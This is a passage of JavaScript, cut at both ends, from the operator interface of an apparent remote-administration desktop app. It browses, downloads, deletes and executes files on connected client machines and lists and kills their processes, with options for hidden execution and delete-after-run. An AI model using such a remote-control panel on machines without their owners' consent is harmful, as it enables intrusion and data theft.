  if (e.key === 'Escape' && terminalOverlay.classList.contains('show')) {
    closeTerminal();
  }
  if (e.key === 'Escape' && filemanagerOverlay.classList.contains('show')) {
    closeFileManager();
  }
});

// ============ File Manager System ============
const filemanagerOverlay = document.getElementById('filemanager-overlay');
const filemanagerTitleText = document.getElementById('filemanager-title-text');
const filemanagerClose = document.getElementById('filemanager-close');
const fmPath = document.getElementById('fm-path');
const fmFileList = document.getElementById('fm-file-list');
const fmDrives = document.getElementById('fm-drives');
const fmStatusText = document.getElementById('fm-status-text');
const fmItemCount = document.getElementById('fm-item-count');
const fmCtx = document.getElementById('fm-ctx');

let currentFmUid = null;
let currentFmPath = '';
let fmHistory = [];
let fmHistoryIndex = -1;
let fmSelectedItems = new Set();
let fmClipboard = { items: [], operation: null }; // cut or copy
let fmCurrentEntries = [];

// Format bytes to human-readable
const formatBytes = (bytes) => {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
};

// SVG wireframe icons matching UI theme
const svgIcons = {
  folder: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>`,
  drive: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b4ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>`,
  file: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b4ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`,
  image: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f472b6" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>`,
  video: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18"/><line x1="7" y1="2" x2="7" y2="22"/><line x1="17" y1="2" x2="17" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/><line x1="2" y1="7" x2="7" y2="7"/><line x1="2" y1="17" x2="7" y2="17"/><line x1="17" y1="17" x2="22" y2="17"/><line x1="17" y1="7" x2="22" y2="7"/></svg>`,
  audio: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>`,
  archive: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fb923c" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>`,
  executable: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>`,
  document: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>`,
  code: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b4ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`,
};

// Get file icon based on extension
const getFileIcon = (name, isDir) => {
  if (isDir) return { icon: svgIcons.folder, type: 'folder' };

  const ext = name.split('.').pop().toLowerCase();
  const iconMap = {
    // Images
    'jpg': { icon: svgIcons.image, type: 'image' },
    'jpeg': { icon: svgIcons.image, type: 'image' },
    'png': { icon: svgIcons.image, type: 'image' },
    'gif': { icon: svgIcons.image, type: 'image' },
    'bmp': { icon: svgIcons.image, type: 'image' },
    'svg': { icon: svgIcons.image, type: 'image' },
    'webp': { icon: svgIcons.image, type: 'image' },
    'ico': { icon: svgIcons.image, type: 'image' },
    // Videos
    'mp4': { icon: svgIcons.video, type: 'video' },
    'avi': { icon: svgIcons.video, type: 'video' },
    'mkv': { icon: svgIcons.video, type: 'video' },
    'mov': { icon: svgIcons.video, type: 'video' },
    'wmv': { icon: svgIcons.video, type: 'video' },
    'flv': { icon: svgIcons.video, type: 'video' },
    // Audio
    'mp3': { icon: svgIcons.audio, type: 'audio' },
    'wav': { icon: svgIcons.audio, type: 'audio' },
    'ogg': { icon: svgIcons.audio, type: 'audio' },
    'flac': { icon: svgIcons.audio, type: 'audio' },
    'm4a': { icon: svgIcons.audio, type: 'audio' },
    // Archives
    'zip': { icon: svgIcons.archive, type: 'archive' },
    'rar': { icon: svgIcons.archive, type: 'archive' },
    '7z': { icon: svgIcons.archive, type: 'archive' },
    'tar': { icon: svgIcons.archive, type: 'archive' },
    'gz': { icon: svgIcons.archive, type: 'archive' },
    // Executables
    'exe': { icon: svgIcons.executable, type: 'executable' },
    'msi': { icon: svgIcons.executable, type: 'executable' },
    'bat': { icon: svgIcons.executable, type: 'executable' },
    'cmd': { icon: svgIcons.executable, type: 'executable' },
    'ps1': { icon: svgIcons.executable, type: 'executable' },
    // Documents
    'pdf': { icon: svgIcons.document, type: 'document' },
    'doc': { icon: svgIcons.document, type: 'document' },
    'docx': { icon: svgIcons.document, type: 'document' },
    'xls': { icon: svgIcons.document, type: 'document' },
    'xlsx': { icon: svgIcons.document, type: 'document' },
    'ppt': { icon: svgIcons.document, type: 'document' },
    'pptx': { icon: svgIcons.document, type: 'document' },
    'txt': { icon: svgIcons.document, type: 'document' },
    'rtf': { icon: svgIcons.document, type: 'document' },
    // Code
    'js': { icon: svgIcons.code, type: 'file' },
    'ts': { icon: svgIcons.code, type: 'file' },
    'py': { icon: svgIcons.code, type: 'file' },
    'rs': { icon: svgIcons.code, type: 'file' },
    'java': { icon: svgIcons.code, type: 'file' },
    'c': { icon: svgIcons.code, type: 'file' },
    'cpp': { icon: svgIcons.code, type: 'file' },
    'h': { icon: svgIcons.code, type: 'file' },
    'css': { icon: svgIcons.code, type: 'file' },
    'html': { icon: svgIcons.code, type: 'file' },
    'json': { icon: svgIcons.code, type: 'file' },
    'xml': { icon: svgIcons.code, type: 'file' },
    'yaml': { icon: svgIcons.code, type: 'file' },
    'yml': { icon: svgIcons.code, type: 'file' },
  };

  return iconMap[ext] || { icon: svgIcons.file, type: 'file' };
};

// Open file manager for a client
async function openFileManager(client) {
  currentFmUid = client.uid;
  fmHistory = [];
  fmHistoryIndex = -1;
  fmSelectedItems.clear();
  fmClipboard = { items: [], operation: null };

  filemanagerTitleText.textContent = `File Manager - ${client.user}@${client.machine}`;
  fmStatusText.textContent = 'Connecting...';

  filemanagerOverlay.classList.add('show');

  // Load drives first
  await loadDrives();
}

// Close file manager
function closeFileManager() {
  filemanagerOverlay.classList.remove('show');
  currentFmUid = null;
  currentFmPath = '';
  fmFileList.innerHTML = '<div class="fm-loading">Loading...</div>';
}

// Load drives from client
async function loadDrives() {
  try {
    fmStatusText.textContent = 'Loading drives...';
    const response = await invoke('send_command', {
      uid: currentFmUid,
      command: { type: 'ListDrives' }
    });
    // Response comes via event, we set up listener
  } catch (e) {
    fmStatusText.textContent = 'Error: ' + e;
  }
}

// Navigate to a path
async function navigateTo(path, addToHistory = true) {
  if (!currentFmUid) return;

  fmSelectedItems.clear();
  fmStatusText.textContent = 'Loading...';
  fmFileList.innerHTML = '<div class="fm-loading">Loading...</div>';

  try {
    await invoke('send_command', {
      uid: currentFmUid,
      command: { type: 'ListDirectory', params: { path } }
    });

    // Update path display
    currentFmPath = path;
    fmPath.value = path;

    // Add to history
    if (addToHistory) {
      fmHistory = fmHistory.slice(0, fmHistoryIndex + 1);
      fmHistory.push(path);
      fmHistoryIndex = fmHistory.length - 1;
    }

    updateNavigationButtons();
  } catch (e) {
    fmStatusText.textContent = 'Error: ' + e;
    fmFileList.innerHTML = `<div class="fm-loading" style="color:#f87171">Error: ${e}</div>`;
  }
}

// Update navigation button states
function updateNavigationButtons() {
  document.getElementById('fm-back').disabled = fmHistoryIndex <= 0;
  document.getElementById('fm-forward').disabled = fmHistoryIndex >= fmHistory.length - 1;
}

// Render drives in sidebar
function renderDrives(drives) {
  fmDrives.innerHTML = '';

  drives.forEach(drive => {
    const usedPercent = drive.total_bytes > 0
      ? Math.round((drive.total_bytes - drive.free_bytes) / drive.total_bytes * 100)
      : 0;

    const div = document.createElement('div');
    div.className = 'fm-drive-item';
    div.innerHTML = `
      <span class="fm-drive-icon">${svgIcons.drive}</span>
      <div class="fm-drive-info">
        <div class="fm-drive-name" title="${drive.name}">${drive.name}</div>
        <div class="fm-drive-size">${formatBytes(drive.free_bytes)} free</div>
        <div class="fm-drive-bar"><div class="fm-drive-bar-fill" style="width:${usedPercent}%"></div></div>
      </div>
    `;
    div.onclick = () => navigateTo(drive.name);
    fmDrives.appendChild(div);
  });

  // Navigate to first drive
  if (drives.length > 0 && !currentFmPath) {
    navigateTo(drives[0].name);
  }
}

// Render file list
function renderFiles(entries) {
  fmCurrentEntries = entries;
  fmFileList.innerHTML = '';

  if (entries.length === 0) {
    fmFileList.innerHTML = '<div class="fm-loading">Folder is empty</div>';
    fmItemCount.textContent = '0 items';
    fmStatusText.textContent = 'Ready';
    return;
  }

  const grid = document.createElement('div');
  grid.className = 'fm-file-grid';

  entries.forEach((entry, index) => {
    const { icon, type } = getFileIcon(entry.name, entry.is_dir);

    const item = document.createElement('div');
    item.className = 'fm-file-item';
    item.dataset.index = index;
    item.dataset.name = entry.name;
    item.dataset.isDir = entry.is_dir;

    if (fmSelectedItems.has(entry.name)) {
      item.classList.add('selected');
    }

    if (fmClipboard.operation === 'cut' && fmClipboard.items.some(i => i.name === entry.name)) {
      item.classList.add('cut');
    }

    item.innerHTML = `
      <div class="fm-file-icon ${type}">${icon}</div>
      <div class="fm-file-name ${entry.hidden ? 'hidden' : ''}">${entry.name}</div>
      ${!entry.is_dir ? `<div class="fm-file-size">${formatBytes(entry.size)}</div>` : ''}
    `;

    // Single click to select
    item.onclick = (e) => {
      e.stopPropagation();
      if (e.ctrlKey) {
        // Toggle selection
        if (fmSelectedItems.has(entry.name)) {
          fmSelectedItems.delete(entry.name);
          item.classList.remove('selected');
        } else {
          fmSelectedItems.add(entry.name);
          item.classList.add('selected');
        }
      } else {
        // Clear and select one
        fmSelectedItems.clear();
        grid.querySelectorAll('.fm-file-item').forEach(el => el.classList.remove('selected'));
        fmSelectedItems.add(entry.name);
        item.classList.add('selected');
      }
    };

    // Double click to open folders only (not execute files for safety)
    item.ondblclick = () => {
      if (entry.is_dir) {
        const newPath = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
          ? currentFmPath + entry.name
          : currentFmPath + '\\' + entry.name;
        navigateTo(newPath);
      }
      // Files require explicit right-click > Execute for safety
    };

    // Right click context menu
    item.oncontextmenu = (e) => {
      e.preventDefault();
      e.stopPropagation();

      // Select if not already selected
      if (!fmSelectedItems.has(entry.name)) {
        fmSelectedItems.clear();
        grid.querySelectorAll('.fm-file-item').forEach(el => el.classList.remove('selected'));
        fmSelectedItems.add(entry.name);
        item.classList.add('selected');
      }

      showFmContextMenu(e.pageX, e.pageY);
    };

    grid.appendChild(item);
  });

  fmFileList.appendChild(grid);

  const fileCount = entries.filter(e => !e.is_dir).length;
  const folderCount = entries.filter(e => e.is_dir).length;
  fmItemCount.textContent = `${folderCount} folder${folderCount !== 1 ? 's' : ''}, ${fileCount} file${fileCount !== 1 ? 's' : ''}`;
  fmStatusText.textContent = 'Ready';
}

// Show file manager context menu
function showFmContextMenu(x, y) {
  positionContextMenu(fmCtx, x, y);
}

// Execute file on client
async function executeFile(filename) {
  const path = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
    ? currentFmPath + filename
    : currentFmPath + '\\' + filename;

  try {
    await invoke('send_command', {
      uid: currentFmUid,
      command: { type: 'FileExecute', params: { path, args: null, hidden: false, delete_after: false, independent: false } }
    });
    fmStatusText.textContent = 'Executed: ' + filename;
  } catch (e) {
    fmStatusText.textContent = 'Error: ' + e;
  }
}

// Delete selected files
async function deleteSelected() {
  if (fmSelectedItems.size === 0) return;

  const items = Array.from(fmSelectedItems);
  if (!confirm(`Delete ${items.length} item(s)?\n\n${items.join('\n')}`)) return;

  for (const name of items) {
    const path = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
      ? currentFmPath + name
      : currentFmPath + '\\' + name;

    try {
      await invoke('send_command', {
        uid: currentFmUid,
        command: { type: 'FileDelete', params: { path, recursive: true } }
      });
    } catch (e) {
      fmStatusText.textContent = 'Error deleting: ' + e;
      return;
    }
  }

  fmStatusText.textContent = `Deleted ${items.length} item(s)`;
  navigateTo(currentFmPath, false);
}

// Rename selected file
async function renameSelected() {
  if (fmSelectedItems.size !== 1) return;

  const oldName = Array.from(fmSelectedItems)[0];
  const newName = prompt('Enter new name:', oldName);
  if (!newName || newName === oldName) return;

  const oldPath = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
    ? currentFmPath + oldName
    : currentFmPath + '\\' + oldName;
  const newPath = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
    ? currentFmPath + newName
    : currentFmPath + '\\' + newName;

  try {
    await invoke('send_command', {
      uid: currentFmUid,
      command: { type: 'FileRename', params: { old_path: oldPath, new_path: newPath } }
    });
    fmStatusText.textContent = 'Renamed to: ' + newName;
    navigateTo(currentFmPath, false);
  } catch (e) {
    fmStatusText.textContent = 'Error: ' + e;
  }
}

// Create new folder
async function createNewFolder() {
  const name = prompt('Enter folder name:');
  if (!name) return;

  const path = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
    ? currentFmPath + name
    : currentFmPath + '\\' + name;

  try {
    await invoke('send_command', {
      uid: currentFmUid,
      command: { type: 'CreateDirectory', params: { path } }
    });
    fmStatusText.textContent = 'Created folder: ' + name;
    navigateTo(currentFmPath, false);
  } catch (e) {
    fmStatusText.textContent = 'Error: ' + e;
  }
}

// Copy selected to clipboard
function copySelected() {
  if (fmSelectedItems.size === 0) return;

  fmClipboard = {
    items: Array.from(fmSelectedItems).map(name => ({
      name,
      sourcePath: currentFmPath
    })),
    operation: 'copy'
  };
  fmStatusText.textContent = `Copied ${fmClipboard.items.length} item(s)`;
  renderFiles(fmCurrentEntries); // Re-render to update visual
}

// Cut selected to clipboard
function cutSelected() {
  if (fmSelectedItems.size === 0) return;

  fmClipboard = {
    items: Array.from(fmSelectedItems).map(name => ({
      name,
      sourcePath: currentFmPath
    })),
    operation: 'cut'
  };
  fmStatusText.textContent = `Cut ${fmClipboard.items.length} item(s)`;
  renderFiles(fmCurrentEntries); // Re-render to show cut state
}

// Paste from clipboard
async function pasteClipboard() {
  if (fmClipboard.items.length === 0) return;

  for (const item of fmClipboard.items) {
    const sourcePath = item.sourcePath.endsWith('\\') || item.sourcePath.endsWith('/')
      ? item.sourcePath + item.name
      : item.sourcePath + '\\' + item.name;
    const destPath = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
      ? currentFmPath + item.name
      : currentFmPath + '\\' + item.name;

    try {
      if (fmClipboard.operation === 'cut') {
        await invoke('send_command', {
          uid: currentFmUid,
          command: { type: 'FileRename', params: { old_path: sourcePath, new_path: destPath } }
        });
      } else {
        await invoke('send_command', {
          uid: currentFmUid,
          command: { type: 'FileCopy', params: { source: sourcePath, destination: destPath } }
        });
      }
    } catch (e) {
      fmStatusText.textContent = 'Error: ' + e;
      return;
    }
  }

  fmStatusText.textContent = `Pasted ${fmClipboard.items.length} item(s)`;
  if (fmClipboard.operation === 'cut') {
    fmClipboard = { items: [], operation: null };
  }
  navigateTo(currentFmPath, false);
}

// Download selected file
async function downloadSelected() {
  if (fmSelectedItems.size !== 1) {
    alert('Please select a single file to download');
    return;
  }

  const name = Array.from(fmSelectedItems)[0];
  const entry = fmCurrentEntries.find(e => e.name === name);
  if (!entry || entry.is_dir) {
    alert('Cannot download folders');
    return;
  }

  const path = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
    ? currentFmPath + name
    : currentFmPath + '\\' + name;

  fmStatusText.textContent = 'Downloading...';

  try {
    await invoke('send_command', {
      uid: currentFmUid,
      command: { type: 'FileDownload', params: { path } }
    });
    // File data comes via event - need to handle saving
  } catch (e) {
    fmStatusText.textContent = 'Error: ' + e;
  }
}

// Set up file manager event listeners
function setupFileManagerEventListeners() {
  if (window.__TAURI__?.event) {
    const { listen } = window.__TAURI__.event;

    // Listen for command responses (same event as shell uses)
    listen('shell-response', async (event) => {
      if (event.payload.uid !== currentFmUid) return;

      const response = event.payload.response;
      if (!response || !response.data) return;

      // Handle different response types
      switch (response.data.type) {
        case 'DrivesList':
          if (response.data.result?.drives) {
            renderDrives(response.data.result.drives);
          }
          break;
        case 'DirectoryListing':
          if (response.data.result?.entries) {
            renderFiles(response.data.result.entries);
          }
          break;
        case 'FileData':
          // Handle file download - prompt for save location
          if (response.data.result?.data) {
            const data = response.data.result.data;
            const filename = Array.from(fmSelectedItems)[0] || 'download';
            fmStatusText.textContent = 'Saving...';
            try {
              const saved = await invoke('save_file_with_dialog', {
                filename: filename,
                data: Array.from(data) // Convert to array for serialization
              });
              if (saved) {
                fmStatusText.textContent = 'Download complete';
              } else {
                fmStatusText.textContent = 'Download cancelled';
              }
            } catch (e) {
              fmStatusText.textContent = 'Error: ' + e;
            }
          }
          break;
        case 'FileResult':
          // Generic file operation result - refresh current dir
          if (response.data.result?.success) {
            // Refresh happens in the calling function
          } else if (response.data.result?.error) {
            fmStatusText.textContent = 'Error: ' + response.data.result.error;
          }
          break;
        case 'Error':
          fmStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
          fmFileList.innerHTML = `<div class="fm-loading" style="color:#f87171">Error: ${response.data.result?.message}</div>`;
          break;
      }
    });
  }
}

// Initialize file manager event listeners on load
setupFileManagerEventListeners();

// File manager toolbar buttons
document.getElementById('fm-back')?.addEventListener('click', () => {
  if (fmHistoryIndex > 0) {
    fmHistoryIndex--;
    navigateTo(fmHistory[fmHistoryIndex], false);
  }
});

document.getElementById('fm-forward')?.addEventListener('click', () => {
  if (fmHistoryIndex < fmHistory.length - 1) {
    fmHistoryIndex++;
    navigateTo(fmHistory[fmHistoryIndex], false);
  }
});

document.getElementById('fm-up')?.addEventListener('click', () => {
  if (!currentFmPath) return;
  // Go to parent directory
  const parts = currentFmPath.replace(/[\\/]+$/, '').split(/[\\/]/);
  if (parts.length > 1) {
    parts.pop();
    let parent = parts.join('\\');
    if (parent.length === 2 && parent[1] === ':') parent += '\\'; // C: -> C:\
    navigateTo(parent);
  }
});

document.getElementById('fm-refresh')?.addEventListener('click', () => {
  if (currentFmPath) {
    navigateTo(currentFmPath, false);
  }
});

document.getElementById('fm-home')?.addEventListener('click', () => {
  loadDrives();
});

document.getElementById('fm-go')?.addEventListener('click', () => {
  const path = fmPath.value.trim();
  if (path) {
    navigateTo(path);
  }
});

fmPath?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const path = fmPath.value.trim();
    if (path) {
      navigateTo(path);
    }
  }
});

// Close button
filemanagerClose?.addEventListener('click', closeFileManager);

// Click outside file list to deselect
fmFileList?.addEventListener('click', (e) => {
  if (e.target === fmFileList || e.target.classList.contains('fm-file-grid')) {
    fmSelectedItems.clear();
    fmFileList.querySelectorAll('.fm-file-item.selected').forEach(el => el.classList.remove('selected'));
  }
});

// Context menu for empty space
fmFileList?.addEventListener('contextmenu', (e) => {
  if (e.target === fmFileList || e.target.classList.contains('fm-file-grid') || e.target.classList.contains('fm-loading')) {
    e.preventDefault();
    fmSelectedItems.clear();
    fmFileList.querySelectorAll('.fm-file-item.selected').forEach(el => el.classList.remove('selected'));
    showFmContextMenu(e.pageX, e.pageY);
  }
});

// Hide context menu on click outside
document.addEventListener('click', (e) => {
  if (!e.target.closest('.fm-ctx')) {
    fmCtx?.classList.remove('show');
  }
});

// Context menu actions
fmCtx?.addEventListener('click', (e) => {
  const action = e.target.dataset.action;
  if (!action) return;

  fmCtx.classList.remove('show');

  switch (action) {
    case 'fm-open':
      if (fmSelectedItems.size === 1) {
        const name = Array.from(fmSelectedItems)[0];
        const entry = fmCurrentEntries.find(e => e.name === name);
        if (entry?.is_dir) {
          const newPath = currentFmPath.endsWith('\\') || currentFmPath.endsWith('/')
            ? currentFmPath + name
            : currentFmPath + '\\' + name;
          navigateTo(newPath);
        }
        // Files require explicit right-click > Execute for safety
      }
      break;
    case 'fm-download':
      downloadSelected();
      break;
    case 'fm-cut':
      cutSelected();
      break;
    case 'fm-copy':
      copySelected();
      break;
    case 'fm-paste':
      pasteClipboard();
      break;
    case 'fm-rename':
      renameSelected();
      break;
    case 'fm-delete':
      deleteSelected();
      break;
    case 'fm-newfolder':
      createNewFolder();
      break;
    case 'fm-properties':
      // Show properties dialog (could be expanded)
      if (fmSelectedItems.size === 1) {
        const name = Array.from(fmSelectedItems)[0];
        const entry = fmCurrentEntries.find(e => e.name === name);
        if (entry) {
          alert(`Name: ${entry.name}\nSize: ${formatBytes(entry.size)}\nType: ${entry.is_dir ? 'Folder' : 'File'}\nHidden: ${entry.hidden}\nRead-only: ${entry.readonly}`);
        }
      }
      break;
  }
});

// Quick access items
document.querySelectorAll('.fm-quick-item').forEach(item => {
  item.addEventListener('click', () => {
    const path = item.dataset.path;
    if (path) {
      navigateTo(path);
    }
  });
});

// ============ Process Manager System ============

// Process Manager DOM elements
const procmgrOverlay = document.getElementById('procmgr-overlay');
const procmgrClose = document.getElementById('procmgr-close');
const pmProcessList = document.getElementById('pm-process-list');
const pmRefresh = document.getElementById('pm-refresh');
const pmSearch = document.getElementById('pm-search');
const pmStatusText = document.getElementById('pm-status-text');
const procmgrTitleText = document.getElementById('procmgr-title-text');
const pmContextMenu = document.getElementById('pm-context-menu');

// Process Manager state
let currentPmUid = null;
let pmProcesses = [];
let pmSelectedPid = null;
let pmSortColumn = 'memory';
let pmSortAsc = false;
let pmSearchFilter = '';

// Open process manager for a client
async function openProcessManager(client) {
  currentPmUid = client.uid;
  pmSelectedPid = null;
  pmProcesses = [];
  pmSearchFilter = '';
  pmSearch.value = '';

  procmgrTitleText.textContent = `Process Manager - ${client.user}@${client.machine}`;
  procmgrOverlay.classList.add('show');

  // Load initial process list
  loadProcesses();
}

// Close process manager
function closeProcessManager() {
  procmgrOverlay.classList.remove('show');
  currentPmUid = null;
  pmSelectedPid = null;
}

// Load process list from client
async function loadProcesses() {
  if (!currentPmUid) return;

  pmStatusText.textContent = 'Loading...';
  pmProcessList.innerHTML = '<tr><td colspan="3" class="pm-loading">Loading...</td></tr>';

  try {
    await invoke('send_command', {
      uid: currentPmUid,
      command: { type: 'ListProcesses' }
    });
  } catch (e) {
    pmStatusText.textContent = 'Error: ' + e;
    pmProcessList.innerHTML = `<tr><td colspan="3" class="pm-loading" style="color:#f87171">Error: ${e}</td></tr>`;
  }
}

// Render process list
function renderProcesses(processes) {
  pmProcesses = processes;
  pmStatusText.textContent = 'Ready';

  // Apply search filter
  let filtered = pmProcesses;
  if (pmSearchFilter) {
    const search = pmSearchFilter.toLowerCase();
    filtered = pmProcesses.filter(p =>
      p.name.toLowerCase().includes(search) ||
      p.pid.toString().includes(search)
    );
  }

  // Apply sorting
  filtered.sort((a, b) => {
    let cmp = 0;
    switch (pmSortColumn) {
      case 'name':
        cmp = a.name.toLowerCase().localeCompare(b.name.toLowerCase());
        break;
      case 'pid':
        cmp = a.pid - b.pid;
        break;
      case 'memory':
        cmp = a.memory_bytes - b.memory_bytes;
        break;
    }
    return pmSortAsc ? cmp : -cmp;
  });

  // Update status with count
  pmStatusText.textContent = `${filtered.length} processes`;

  // Clear and render
  pmProcessList.innerHTML = '';

  if (filtered.length === 0) {
    pmProcessList.innerHTML = '<tr><td colspan="3" class="pm-loading">No processes found</td></tr>';
    return;
  }

  filtered.forEach(proc => {
    const tr = document.createElement('tr');
    tr.dataset.pid = proc.pid;

    if (proc.pid === pmSelectedPid) {
      tr.classList.add('selected');
    }

    tr.innerHTML = `
      <td class="pm-col-name">${escapeHtml(proc.name)}</td>
      <td class="pm-col-pid">${proc.pid}</td>
      <td class="pm-col-memory">${formatBytes(proc.memory_bytes)}</td>
    `;

    tr.addEventListener('click', () => {
      // Deselect previous
      pmProcessList.querySelectorAll('tr.selected').forEach(el => el.classList.remove('selected'));
      // Select this one
      tr.classList.add('selected');
      pmSelectedPid = proc.pid;
    });

    tr.addEventListener('contextmenu', (e) => {
      // Right-click to show context menu
      showPmContextMenu(e, proc.pid);
    });

    pmProcessList.appendChild(tr);
  });
}

// Escape HTML
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Kill selected process
let lastKilledName = null;

async function killProcess(pid, name) {
  if (!currentPmUid || !pid) return;

  lastKilledName = name || 'Process';
  pmStatusText.textContent = 'Killing process...';

  try {
    await invoke('send_command', {
      uid: currentPmUid,
      command: { type: 'KillProcess', params: { pid: pid } }
    });
    // Response will trigger refresh via event listener
  } catch (e) {
    pmStatusText.textContent = 'Error: ' + e;
  }
}

// Sort column click handler
function setupPmSorting() {
  document.querySelectorAll('.pm-table th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      const col = th.dataset.sort;

      // Toggle direction if same column
      if (pmSortColumn === col) {
        pmSortAsc = !pmSortAsc;
      } else {
        pmSortColumn = col;
        pmSortAsc = col === 'name'; // Default asc for name, desc for others
      }

      // Update UI
      document.querySelectorAll('.pm-table th').forEach(h => {
        h.classList.remove('sorted-asc', 'sorted-desc');
      });
      th.classList.add(pmSortAsc ? 'sorted-asc' : 'sorted-desc');

      // Re-render
      renderProcesses(pmProcesses);
    });
  });
}

// Process Manager event listeners
procmgrClose?.addEventListener('click', closeProcessManager);

pmRefresh?.addEventListener('click', () => {
  loadProcesses();
});

pmSearch?.addEventListener('input', (e) => {
  pmSearchFilter = e.target.value;
  renderProcesses(pmProcesses);
});

// Context menu for process actions
let pmContextPid = null;

function showPmContextMenu(e, pid) {
  e.preventDefault();
  e.stopPropagation();
  pmContextPid = pid;

  // Hide first, position with flip logic, then show
  pmContextMenu.classList.remove('show');
  setTimeout(() => positionContextMenu(pmContextMenu, e.clientX, e.clientY), 10);
}

function hidePmContextMenu() {
  pmContextMenu.classList.remove('show');
  pmContextPid = null;
}

// Hide context menu on click outside
document.addEventListener('click', () => {
  hidePmContextMenu();
});

// Handle context menu actions
pmContextMenu?.addEventListener('click', (e) => {
  e.stopPropagation();
  const item = e.target.closest('.ctx-item');
  if (!item || !pmContextPid) return;

  const action = item.dataset.action;
  const proc = pmProcesses.find(p => p.pid === pmContextPid);
  const name = proc ? proc.name : 'Unknown';

  if (action === 'kill') {
    killProcess(pmContextPid, name);
  }

  hidePmContextMenu();
});

// Hide context menu on mouse leave
pmContextMenu?.addEventListener('mouseleave', () => {
  hidePmContextMenu();
});

// Close on escape key
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && procmgrOverlay?.classList.contains('show')) {
    closeProcessManager();
  }
});

// Close on overlay click (outside window)
procmgrOverlay?.addEventListener('click', (e) => {
  if (e.target === procmgrOverlay) {
    closeProcessManager();
  }
});

// Initialize sorting
setupPmSorting();

// Process Manager shell-response listener
(async function setupPmResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
